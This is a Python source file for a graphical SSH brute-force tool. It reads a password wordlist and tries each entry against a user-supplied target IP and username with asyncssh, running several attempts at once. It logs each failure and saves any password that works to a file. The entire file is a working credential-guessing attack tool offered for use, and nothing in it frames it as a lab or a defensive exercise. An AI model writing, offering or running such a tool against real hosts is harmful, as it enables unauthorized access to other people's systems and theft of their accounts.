import asyncio                                                                                                                                                                                                                                                                                                             
import asyncssh                                                                                                                                                                                                                                                                                                            
import tkinter as tk                                                                                                                                                                                                                                                                                                       
from tkinter import filedialog, messagebox, scrolledtext                                                                                                                                                                                                                                                                   
from termcolor import colored                                                                                                                                                                                                                                                                                              
from datetime import datetime                                                                                                                                                                                                                                                                                              
from os import path                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
LOG_FILE = "bruteforce_log.txt"                                                                                                                                                                                                                                                                                            
SUCCESS_FILE = "successful_logins.txt"                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                           
class SSHBruteForcerApp:                                                                                                                                                                                                                                                                                                   
    def __init__(self, root):                                                                                                                                                                                                                                                                                              
        self.root = root                                                                                                                                                                                                                                                                                                   
        self.root.title("SSH Brute-Forcer")                                                                                                                                                                                                                                                                                

        # GUI Layout
        tk.Label(root, text="Target IP:").grid(row=0, column=0, padx=5, pady=5)
        self.target_entry = tk.Entry(root, width=30)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5)

        tk.Label(root, text="Username:").grid(row=1, column=0, padx=5, pady=5)
        self.username_entry = tk.Entry(root, width=30)
        self.username_entry.grid(row=1, column=1, padx=5, pady=5)

        tk.Label(root, text="Port:").grid(row=2, column=0, padx=5, pady=5)
        self.port_entry = tk.Entry(root, width=10)
        self.port_entry.insert(0, "22")
        self.port_entry.grid(row=2, column=1, padx=5, pady=5)

        tk.Label(root, text="Wordlist:").grid(row=3, column=0, padx=5, pady=5)
        self.wordlist_entry = tk.Entry(root, width=30)
        self.wordlist_entry.grid(row=3, column=1, padx=5, pady=5)
        tk.Button(root, text="Browse", command=self.browse_wordlist).grid(row=3, column=2, padx=5, pady=5)

        self.start_button = tk.Button(root, text="Start Attack", command=self.start_attack, bg="red", fg="white")
        self.start_button.grid(row=4, column=0, columnspan=3, pady=10)

        self.output_text = scrolledtext.ScrolledText(root, width=60, height=15, wrap=tk.WORD)
        self.output_text.grid(row=5, column=0, columnspan=3, padx=10, pady=10)

        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    def browse_wordlist(self):
        filename = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if filename:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, filename)

    def log_output(self, message, color="black"):
        """Logs output in GUI and writes to file."""
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.see(tk.END)

        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.now()} - {message}\n")

    async def ssh_bruteforce(self, hostname, username, password, port, found_flag):
        if found_flag.is_set():
            return

        try:
            async with asyncssh.connect(hostname, username=username, password=password) as conn:
                found_flag.set()
                success_message = f"[SUCCESS] {hostname} | {username} | {password}"
                self.log_output(success_message, "green")

                with open(SUCCESS_FILE, "a") as success_file:
                    success_file.write(f"{success_message}\n")

                messagebox.showinfo("Success", f"Password Found: {password}")
                return

        except asyncssh.PermissionDenied:
            self.log_output(f"[FAILED] {hostname} | {username} | {password}", "red")

        except Exception as err:
            self.log_output(f"[ERROR] {err}", "red")

    async def main(self, hostname, port, username, wordlist):
        tasks = []
        found_flag = asyncio.Event()
        concurrency_limit = 10
        counter = 0

        try:
            with open(wordlist, 'r', encoding="latin-1") as f:
                passwords = [line.strip() for line in f.readlines()]
        except Exception as e:
            self.log_output(f"[-] Error reading wordlist: {e}", "red")
            return

        for password in passwords:
            if found_flag.is_set():
                break

            if counter >= concurrency_limit:
                await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = []
                counter = 0

            tasks.append(asyncio.create_task(self.ssh_bruteforce(hostname, username, password, port, found_flag)))
            await asyncio.sleep(0.5)
            counter += 1

        await asyncio.gather(*tasks)

        if not found_flag.is_set():
            self.log_output("[-] Failed to find the correct password.", "red")

    def start_attack(self):
        target = self.target_entry.get()
        username = self.username_entry.get()
        port = self.port_entry.get()
        wordlist = self.wordlist_entry.get()

        if not target or not username or not port or not wordlist:
            messagebox.showerror("Error", "All fields are required!")
            return

        if not path.exists(wordlist):
            messagebox.showerror("Error", "Wordlist file not found!")
            return

        self.output_text.delete("1.0", tk.END)
        self.log_output(f"Starting SSH Brute-Force Attack on {target}...")

        self.loop.run_in_executor(None, lambda: asyncio.run(self.main(target, int(port), username, wordlist)))


if __name__ == "__main__":
    root = tk.Tk()
    app = SSHBruteForcerApp(root)
    root.mainloop()
